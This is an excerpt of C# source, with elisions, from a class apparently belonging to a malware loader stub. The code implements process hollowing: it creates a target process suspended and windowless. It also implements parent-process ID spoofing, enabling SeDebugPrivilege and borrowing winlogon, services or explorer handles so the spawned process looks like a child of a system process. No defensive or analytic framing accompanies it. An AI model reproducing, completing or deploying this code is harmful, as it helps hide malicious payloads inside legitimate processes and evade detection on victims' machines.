...
internal static class ProcessHollowing
{
    ...
    public static int SpawnDetached(string exePath, IReadOnlyDictionary<string, string?> envOverrides)
    {
        ...
        nint hParent  = GetSpoofParentHandle(); // always spoof; elevated case uses winlogon/services
    ...
    /// <summary>
    /// Get a handle for PPID spoofing.
    /// When elevated: prefer winlogon/services so the child appears as a system process child.
    /// Otherwise: use explorer.exe, fallback svchost.
    /// </summary>
    private static nint GetSpoofParentHandle()
    {
        if (IsElevated())
        {
            // SeDebugPrivilege is required to open SYSTEM-level processes (winlogon, services)
            // for PPID spoofing. Enable it here — it's already present in the elevated token
            // but may not be enabled by default.
            Protection.EnablePrivilege(20);

            // Elevated: spoof to a system-level elevated process so the child
            // doesn't appear as a child of our own elevated stub.
            foreach (var name in new[] { "winlogon", "services" })
            {
                try
                {
                    ...
                    if (procs.Length > 0)
                    {
                        var h = OpenProcess(PROCESS_CREATE_PROCESS, false, procs[0].Id);
                        if (h != 0)
                        {
                            StubLog.Info($"[Hollow] PPID spoof (elevated): {name}.exe PID={procs[0].Id}");
                            return h;
                        }
                    }
                }
        ...
        // Non-elevated (or elevated fallback): explorer.exe
        try
        {
    ...
    public static int Hollow(string pePath, string targetProcess, bool skipPpidSpoof = false,
        IReadOnlyDictionary<string, string?>? envOverrides = null, string? cmdLineOverride = null)
    {
        ...
        nint attrList = 0;
        nint hParentPtr = 0;
        nint envBlock = envOverrides != null ? BuildEnvBlock(envOverrides) : nint.Zero;
        var siEx = new STARTUPINFOEXW();
        siEx.StartupInfo.cb = Marshal.SizeOf<STARTUPINFOEXW>();
        uint createFlags = CREATE_SUSPENDED | CREATE_NO_WINDOW;
        if (envBlock != nint.Zero) createFlags |= CREATE_UNICODE_ENVIRONMENT;
        ...
        nint cmdLineBuf = cmdLineOverride != null
            ? Marshal.StringToHGlobalUni(cmdLineOverride)
            : nint.Zero;

        bool created = CreateProcessW(targetProcess, cmdLineBuf, 0, 0, false,
            createFlags, envBlock, nint.Zero, ref siEx, out var pi);

        if (!created)
        {
            StubLog.Error($"[Hollow] CreateProcess failed: {Marshal.GetLastWin32Error()}");
            if (cmdLineBuf != nint.Zero) Marshal.FreeHGlobal(cmdLineBuf);
            if (attrList != 0) { DeleteProcThreadAttributeList(attrList); Marshal.FreeHGlobal(attrList); }
            if (hParentPtr != 0) Marshal.FreeHGlobal(hParentPtr);
            if (hParent != 0) CloseHandle(hParent);
            CloseHandle(hPEFile);
